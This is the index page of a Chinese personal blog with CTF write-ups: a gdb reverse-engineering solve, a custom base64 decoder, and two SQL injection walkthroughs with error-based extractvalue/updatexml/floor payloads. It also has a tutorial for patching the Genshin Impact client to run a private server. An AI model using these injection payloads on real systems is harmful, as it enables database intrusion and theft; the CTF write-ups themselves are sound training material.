<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Welcome to my blog.">
<meta property="og:type" content="website">
<meta property="og:title" content="Dvgd">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Dvgd">
<meta property="og:description" content="Welcome to my blog.">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Dvgd">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Dvgd</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Dvgd</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Dvgd</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">2</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">2</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">17</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/28/gdb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/28/gdb/" class="post-title-link" itemprop="url">gdb</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-28 20:48:35 / 修改时间：20:57:57" itemprop="dateCreated datePublished" datetime="2023-03-28T20:48:35+08:00">2023-03-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="攻防世界xctf-reverse：no-strings-attached"><a href="#攻防世界xctf-reverse：no-strings-attached" class="headerlink" title="攻防世界xctf reverse：no-strings-attached"></a>攻防世界xctf reverse：no-strings-attached</h1><p>拽入IDA中，shift F12未发现有价值信息，F5</p>
<p><img src="/../images/gdb/20201124111918382.PNG" alt="img"></p>
<p>经过查看，authenticate()为重要函数，通过下面代码分析，S2即为我们需要的flag</p>
<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70.png" alt="img"></p>
<p>s2是由decrypt()函数产生的，来看一下decrypt()函数</p>
<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-16800080187684.png" alt="img"></p>
<p>查看汇编代码，decrypt的返回值在eax中</p>
<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-16800080383316.png" alt="img"></p>
<p>gdb动态调试，在decrypt()函数结尾处下断点，随后读取eax中的值，获取s2</p>
<p>查看.text段的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -t -j .text filename</span><br></pre></td></tr></table></figure>



<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-16800081374698.png" alt="img"></p>
<p>使用disass decrypt 查看汇编代码</p>
<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-168000815365210.png" alt="img"></p>
<p>我们把断点，下在decrypt()函数的最后一条指令上</p>
<p>使用“i b”命令，查看断点信息</p>
<p><img src="/../images/gdb/20201124150835209.PNG" alt="img"></p>
<p>r，运行到断点</p>
<p>n，单步执行，到decrypt()函数结束的下一行</p>
<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-168000818121113.png" alt="img"></p>
<p>i r，查看寄存器的值</p>
<p><img src="/../images/gdb/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ByZXR0eVg=,size_16,color_FFFFFF,t_70-168000819674615.png" alt="img"></p>
<p>查看eax的值：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/6sw $eax</span><br></pre></td></tr></table></figure>

<p>6：显示6行数据</p>
<p>s：字符串形式</p>
<p>w：word（4字节）形式</p>
<p><img src="/../images/gdb/20201124151547501-168000826751320.PNG" alt="img"></p>
<p>flag get</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/20/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/20/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">原神3.5私服搭建教程</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-20 16:34:43 / 修改时间：17:15:50" itemprop="dateCreated datePublished" datetime="2023-03-20T16:34:43+08:00">2023-03-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="原神3-5Grasscutter搭建教程-持续更新"><a href="#原神3-5Grasscutter搭建教程-持续更新" class="headerlink" title="原神3.5Grasscutter搭建教程(持续更新)"></a>原神3.5Grasscutter搭建教程(持续更新)</h1><p>本教程为win端原神3.5版本搭建教程</p>
<p>服务端可能有bug</p>
<p>所有文件和详细教程在群495974787下载 可直接进群</p>
<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>下载安装jdk(java环境), mongodb(数据库), 代理助手和 Grasscutter(服务端)</p>
<p>所需文件已放入[百度网盘](链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1juLK62c5rmsg8ftZghPtPA?pwd=1234),%E5%8F%AF%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD">https://pan.baidu.com/s/1juLK62c5rmsg8ftZghPtPA?pwd=1234),可直接下载</a></p>
<p>注:jdk需要配置环境变量</p>
<p>​	mongodb直接一路next</p>
<p>​	代理助手和 Grasscutter下载解压就行</p>
<h3 id="运行服务端："><a href="#运行服务端：" class="headerlink" title="运行服务端："></a>运行服务端：</h3><p>Grasscutter下载完解压得到以下文件</p>
<p><img src="/../images/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20230320164905936.png" alt="image-20230320164905936"></p>
<p>修改config.json</p>
<p><img src="/../images/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/format,png.png" alt="img"></p>
<p>将两处”accessAddress”: “127.0.0.1”,</p>
<p>改为”accessAddress”: “本机IP地址”,</p>
<p>本机IP地址获取:win+r打开cmd,输入ipconfig</p>
<p>无线局域网适配器 WLAN:  中的ipv4地址即为所需</p>
<p><img src="/../images/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20230320165500702.png" alt="image-20230320165500702"></p>
<p>修改完成切记保存关闭</p>
<p>启动MongoDB数据库</p>
<p><img src="/../images/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20230320165847669.png" alt="image-20230320165847669"></p>
<p>选择connect连接数据库</p>
<p>运行启动.exe</p>
<p><img src="/../images/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20230320170033015.png" alt="image-20230320170033015"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">闪退就是java没配置好或者你根本就没安装</span><br><span class="line">务必启动MongoDB数据库</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20230320170256061.png" alt="image-20230320170256061"></p>
<p>显示 <code>加载完成！输入 &quot;help&quot; 查看命令列表</code>即代表开服成功</p>
<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>自行准备客户端（即你现在的官服）</p>
<p>3.5补丁安装：<br>打开以下路径</p>
<p>国服：Genshin Impact Game<br>国际服：Genshin Impact Game\</p>
<p>复制刚才3.5补丁中的PublicKey.txt和version.dll到此目录</p>
<p>如需切回官服，删除这两个文件即可</p>
<h3 id="Windows连接服务器："><a href="#Windows连接服务器：" class="headerlink" title="Windows连接服务器："></a>Windows连接服务器：</h3><p>有很多方法，任选其一，切记所有代理软件都需要已管理员身份运行。</p>
<p>地址：<code>127.0.0.1</code></p>
<p>代理端口：2888</p>
<p><code>地址填写说明：IP:2888端口(Dispatch端口)，切记使用英文符号</code>。</p>
<p>这里使用原神代理助手,方便好用</p>
<p><img src="/../images/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20230320170652201.png" alt="image-20230320170652201"></p>
<p>出现如图界面,表示代理成功</p>
<h3 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h3><p>双击打开 YuanShen.exe，启动客户端</p>
<p><img src="/../images/%E5%8E%9F%E7%A5%9E3-5%E7%A7%81%E6%9C%8D%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20230320171222469.png" alt="image-20230320171222469"></p>
<p>出现此界面代表你已经搭建成功</p>
<p>在服务器 启动.exe运行窗口输入以下语法进行账户注册</p>
<p>语法：account create 登录账号 UID<br>例如：account create rain 10000</p>
<p>返回客户端输入你注册的账号，密码可随便填</p>
<p>游戏登陆后默认有一个名为 server 的好友，此为游戏控制台，可向其发送指令</p>
<p>游戏内 server 好友输入示例：&#x2F;give all</p>
<p>最新版本需要使用指令点亮地图：&#x2F;prop unlockmap 1</p>
<p>start.bat运行窗口输入示例：give @10001 all</p>
<p>更多指令请使用 GrasscutterTools工具箱查看</p>
<p>1.获得所有物品 &#x2F;give all</p>
<p>2.获取毕业圣遗物 &#x2F;give 76524 lv20 10001 999002 999001 201062,100 201091,100 989001,2 301241,120</p>
<p>PS:不同版本服务端文件会有所不同</p>
<p><strong>本教程可能持续修正更新</strong></p>
<p><strong>搭建途中如遇任何问题,可联系作者qq:2774154591</strong></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/12/base64%E6%8D%A2%E8%A1%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/12/base64%E6%8D%A2%E8%A1%A8/" class="post-title-link" itemprop="url">base64换表</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-12 13:47:30 / 修改时间：13:51:15" itemprop="dateCreated datePublished" datetime="2023-02-12T13:47:30+08:00">2023-02-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ida打开,查看主函数</p>
<p><img src="/../images/base64%E6%8D%A2%E8%A1%A8/6336482063f19.png" alt="image-20220930093555529"></p>
<p>对输入做了处理，然后和一个变量进行对比，查看<code>sub_401570</code>，做了base64操作，只不过用了自定义表，换表即可</p>
<p><img src="/../images/base64%E6%8D%A2%E8%A1%A8/63364866eea95.png" alt="image-20220930093743473"></p>
<p><img src="/../images/base64%E6%8D%A2%E8%A1%A8/633648814e684.png" alt="image-20220930093755396"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1, string2))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/04/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/04/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">extractvalue报错注入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-04 21:11:48" itemprop="dateCreated datePublished" datetime="2023-02-04T21:11:48+08:00">2023-02-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-09 15:24:17" itemprop="dateModified" datetime="2023-05-09T15:24:17+08:00">2023-05-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>判断注入<br>当场景中仅仅将SQL语句带入查询返回页面正确，没有返回点的时候，需要报错注入，用报错的回显。</p>
<p>三种方法extractvalue() updatexml() floor()</p>
<p>(1)extractvalue报错注入:0x7e就是’~’,用来区分数据<br>里面用select语句，不能用union select</p>
<p>concat()函数<br>1.功能：将多个字符串连接成一个字符串。<br>2.语法：concat(str1,str2,…)<br>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
<p>extractvalue报错注入语句格式:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">sql</span>语句),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>

<h6 id="updatexml-形如extractvalue"><a href="#updatexml-形如extractvalue" class="headerlink" title="updatexml()形如extractvalue()"></a>updatexml()形如extractvalue()</h6><p>updatexml()报错注入语句格式:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">sql</span>语句),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>floor()报错注入语句格式:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">sql</span>语句) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>

<p>结果一系列基础流程操作,接下来爆出flag字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/../images/extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>得到一半<code>flag</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">7</span>ad3384c969bf4135fa1dd91</span><br></pre></td></tr></table></figure>

<p>只显示32位，很明显显示的flag不完全，我们需要借助mid函数来进行字符截取从而显示32位以后的数据。</p>
<p><strong><code>mid函数</code></strong></p>
<p><img src="/../images/extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-16755723420422.png" alt="在这里插入图片描述"></p>
<p><strong>SQL MID()语法</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(column_name,<span class="keyword">start</span>[,length]) <span class="keyword">from</span> table_name</span><br></pre></td></tr></table></figure>

<p>这里面注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="keyword">and</span> extractvalue(<span class="keyword">null</span>,concat(<span class="number">0x7e</span>,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">4</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/../images/extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-16755724943734.png" alt="在这里插入图片描述"></p>
<p>得到完整flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;848f2b393a991fa420d9457e&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/04/%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Dvgd.jpg">
      <meta itemprop="name" content="Dvgd">
      <meta itemprop="description" content="Welcome to my blog.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dvgd">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/04/%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">web-整数型注入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-02-04 16:42:35 / 修改时间：21:04:26" itemprop="dateCreated datePublished" datetime="2023-02-04T16:42:35+08:00">2023-02-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>1.根据提示说，试试1，输入1试试</p>
<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>2.再输入框中输入2-1,查询的结果是1，说明存在整数型注入</p>
<p>3.尝试1 and 1&#x3D;1和1 and 1&#x3D;2,and没被过滤</p>
<p>4.尝试<code>1 or 1=1</code>和<code>1 or 1=2,or</code>没被过滤</p>
<p>.使用<code>order by</code>判断列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-16755071289432.png" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/web-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70-16755071591144.png" alt="在这里插入图片描述"></p>
<p>经过测试，可以发现有两列</p>
<p>6.使用<code>union select</code>判断注入点</p>
